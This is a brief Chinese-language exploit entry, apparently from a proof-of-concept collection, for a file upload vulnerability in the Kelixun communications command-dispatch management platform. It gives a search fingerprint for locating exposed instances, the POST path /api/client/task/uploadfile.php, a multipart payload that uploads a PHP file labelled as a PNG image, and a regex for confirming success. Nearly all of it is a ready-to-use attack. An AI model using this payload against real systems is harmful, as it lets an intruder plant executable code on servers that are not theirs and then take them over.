# 科立讯通信指挥调度管理平台uploadfile.php存在文件上传漏洞

科立讯通信指挥调度管理平台 ｜ 文件上传 ｜ —
- **指纹**：`"S8N1l6lqjeQ+TmusVhHTVw=="`
- **请求**：`POST /api/client/task/uploadfile.php HTTP/1.1`

**Payload**
```
------WebKitFormBoundarySwvD8hSn3Z0sHfMu
Content-Disposition: form-data; name="uploadfile";filename="a.php"
Content-Type: image/png
<?php phpinfo(); ?>
------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
```
- **响应特征**：200 ^(?=.*?successed)(?=.*?php).*?$